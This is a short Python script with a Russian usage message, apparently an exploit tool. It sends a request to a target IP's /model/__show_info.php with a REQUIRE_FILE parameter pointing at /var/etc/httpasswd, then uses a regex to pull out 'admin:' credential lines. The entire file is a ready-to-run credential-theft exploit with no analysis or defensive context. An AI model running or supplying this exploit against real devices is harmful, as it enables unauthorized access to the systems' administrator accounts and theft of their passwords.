import urllib.request
import sys
import re

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Укажите адрес')
    else:
        ip_ad = sys.argv[1]

        url = 'http://' + ip_ad + '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
        try:
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req)
            resp_data = resp.read()

            match = r'\t(admin:.*?)\n'
            need = re.findall(match, resp_data.decode('utf-8'))
            print(need)

        except Exception as e:
            print(str(e))
